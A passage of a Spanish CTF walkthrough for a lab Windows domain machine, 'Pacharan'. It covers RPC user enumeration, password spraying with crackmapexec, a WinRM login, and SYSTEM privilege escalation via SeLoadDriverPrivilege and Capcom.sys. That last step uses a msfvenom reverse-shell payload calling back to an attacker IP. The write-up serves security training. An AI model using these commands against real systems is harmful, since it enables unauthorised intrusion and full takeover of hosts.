+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
+index: 0x109c RID: 0x45a acb: 0x00020010 Account: beefeater	Name: Beefeater	Desc: (null)
+index: 0x109d RID: 0x45b acb: 0x00020010 Account: CarlosV	Name: CarlosV	Desc: (null)
+index: 0x109b RID: 0x459 acb: 0x00020010 Account: Chivas	Name: Chivas	Desc: (null)
+index: 0x1096 RID: 0x454 acb: 0x00000210 Account: Chivas Regal	Name: Chivas Regal	Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: Cuenta de usuario administrada por el sistema.
+index: 0x1092 RID: 0x450 acb: 0x00020010 Account: Ginebra	Name: Ginebra	Desc: (null)
+index: 0x109f RID: 0x45d acb: 0x00020010 Account: Gordons	Name: Gordons	Desc: (null)
+index: 0x1095 RID: 0x453 acb: 0x00020010 Account: Hendrick	Name: Hendrick	Desc: (null)
+index: 0xfbd RID: 0x1f5 acb: 0x00000214 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
+index: 0x109a RID: 0x458 acb: 0x00020010 Account: JB	Name: JB	Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
+index: 0x1091 RID: 0x44f acb: 0x00000210 Account: Orujo	Name: Orujo	Desc: (null)
+index: 0x109e RID: 0x45c acb: 0x00020010 Account: RedLabel	Name: RedLabel	Desc: (null)
+index: 0x1094 RID: 0x452 acb: 0x00000210 Account: Whisky	Name: Whisky	Desc: (null)
+index: 0x1099 RID: 0x457 acb: 0x00020010 Account: Whisky2	Name: Whisky2	Desc: (null)
+```
+Nada, no hay algo que nos ayude.
+
+Revisando los recursos compartidos del **servicio SMB**, recordemos que hay un recurso llamado `PDF Pro Virtual Printer` y que tiene una descripción curiosa.
+
+Se da a entender que hay una impresora conectada y esta la podemos ver desde el **servicio RPC** con el comando **enumprinters**:
+```bash
+rpcclient $> enumprinters
+	flags:[0x800000]
+	name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
+	description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,*******]
+	comment:[Soy Hacker y arreglo impresoras]
+```
+Parece que hay una contraseña en la descripción de la impresora.
+
+Podemos probar si le pertenece a algún usuario, pero me doy cuenta de que hay algunos usuarios que no teniamos registrados.
+
+Es posible obtener todos los usuarios con el siguiente comando:
+```bash
+rpcclient -U "whisky%MamasoyStream2er@" 192.168.69.69 -c "enumdomusers" | awk -F '[][]' '{print $2}'
+Administrador
+Invitado
+krbtgt
+DefaultAccount
+Orujo
+Ginebra
+Whisky
+Hendrick
+Chivas Regal
+Whisky2
+JB
+Chivas
+beefeater
+CarlosV
+RedLabel
+Gordons
+```
+Guarda esta nueva lista de usuarios.
+
+Y con **crackmapexec**, aplicamos **password spraying**:
+```bash
+crackmapexec smb 192.168.69.69 -u users.txt -p '******'
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:****** STATUS_LOGON_FAILURE 
+...
+...
+...
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:******
+....
+....
+```
+Excelente, encontramos a quien le pertenece este usuario.
+
+Ahora, podríamos probar si podemos hacerlo algo en el **servicio SMB**, pero veamos si podemos usar estas credenciales para entrar al **servicio WinRM**:
+```bash
+crackmapexec winrm 192.168.69.69 -u 'Chivas Regal' -p ' **************'
+SMB         192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
+HTTP        192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] http://192.168.69.69:5985/wsman
+WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:********* (Pwn3d!)
+```
+Funciono.
+
+Vamos a conectarnos con la heramienta **evil-winrm**:
+```
+evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents>
+```
+Y estamos dentro.
+
+Aquí podemos encontrar la flag del usuario:
+```bash
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> dir
+
+
+    Directorio: C:\Users\Chivas Regal\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/1/2024  10:29 AM             36 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
+....
+```
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+</div>
+<br>
+
+
+<h2 id="Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</h2>
+
+Investigando un poco, existe la posibilidad de utilizar el privilegio SeLoadDriverPrivilege para escalar privilegios. En el siguiente blog se explica bastante bien el como se hace esto:
+* <a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank">Abusando SeLoadDriverPrivilege para elevar privilegios</a>
+
+En resumen, este privilegio permite la carga de controladores de kernel maliciosos, pues permite a un usuario con privilegios limitados cargar y administrar controladores del kernel (drivers). 
+
+Si un atacante puede aprovecharse de este privilegio, puede cargar un controlador malicioso firmado o incluso explotar vulnerabilidades en controladores legítimos para ejecutar código en modo kernel (Ring 0), obteniendo así privilegios de SYSTEM/Administrador.
+
+Tenemos dos repositorios que muestran la forma de explotar esta vulnerabilidad:
+* <a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege" target="_blank">Repositorio de JoshMorrison99: SeLoadDriverPrivilege</a>
+* <a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">Repositorio de k4sth4: SeLoadDriverPrivilege</a>
+
+En mi caso, voy a usar el repositorio de **JoshMorrison99**.
+
+Podemos clonar el repo para empezar a cargar los archivos:
+```bash
+git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
+Clonando en 'SeLoadDriverPrivilege'...
+remote: Enumerating objects: 20, done.
+remote: Counting objects: 100% (20/20), done.
+remote: Compressing objects: 100% (16/16), done.
+remote: Total 20 (delta 5), reused 16 (delta 4), pack-reused 0 (from 0)
+Recibiendo objetos: 100% (20/20), 270.13 KiB | 1.71 MiB/s, listo.
+Resolviendo deltas: 100% (5/5), listo.
+```
+
+Ahora, debemos crear una **Reverse Shell** con **msfvenom**:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f exe -o revShell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: revShell.exe
+```
+
+Con esto listo, vamos a cargar todos los archivos, que en total serían 4, a nuestra sesión de **evil-winrm**:
+```batch
+*Evil-WinRM* PS C:\> mkdir Temp
+*Evil-WinRM* PS C:\> cd Temp
+*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe                                        
+Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe to C:\Temp\LoadDriver.exe
+Data: 20480 bytes of 20480 bytes copied
+Info: Upload successful!
+.
+*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe
+Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe to C:\Temp\ExploitCapcom.exe
+Data: 357716 bytes of 357716 bytes copied
+Info: Upload successful!
+.
+*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys
+Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys to C:\Temp\Capcom.sys
+Data: 14100 bytes of 14100 bytes copied
+Info: Upload successful!
+.
+*Evil-WinRM* PS C:\Temp> upload revShell.exe
+Info: Uploading /../TheHackersLabs/Pacharan/content/revShell.exe to C:\Temp\revShell.exe
+Data: 9556 bytes of 9556 bytes copied
+Info: Upload successful!
+```
+
+De acuerdo a las instrucciones, debemos invocar el binario **LoadDriver.exe** junto al archivo **Capcom.sys** y el resultado nos debe dar `NTSTATUS: 00000000, WinError: 0`:
+```batch
+*Evil-WinRM* PS C:\Temp> .\LoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
+RegCreateKeyEx failed: 0x0
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\System\CurrentControlSet\MyService
+NTSTATUS: 00000000, WinError: 0
+```
+Parece que funciono.
+
+Vamos a abrir una **netcat** usando **rlwrap**:
+```bash
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+```
+
+Por último, ejecutamos el binario **ExploitCapcom.exe** indicandole que ejecute nuestra **Reverse Shell**:
+```batch
+*Evil-WinRM* PS C:\Temp> .\ExploitCapcom.exe C:\Temp\revShell.exe
+[+] Path is: C:\Temp\revShell.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000080
+[*] Shellcode was placed at 0000026AEFD30008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched
+[*] Press any key to exit this program
+```
+
+Veamos si recibimos algo en la **netcat**:
+```batch
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.69.69] 60134
+Microsoft Windows [Versi�n 10.0.14393]
+(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+.
+C:\Temp>whoami
+whoami
+nt authority\system
+```
+Fue un exito.
+
+Ya solo buscamos la flag del administrador:
+```batch
+C:\Users\Administrador\Desktop>type root.txt
+type root.txt
+...
+```
+Con esto completamos la máquina.
+
+
+<br>
+<br>
+<div style="position: relative;">
+  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+</div>
+
+
+* https://github.com/ropnop/kerbrute
+* https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeLoadDriverPrivilege#seloaddriverprivilege
+* https://github.com/JoshMorrison99/SeLoadDriverPrivilege?tab=readme-ov-file
+* https://github.com/k4sth4/SeLoadDriverPrivilege
+* https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/
+
+
+<br>
+# FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
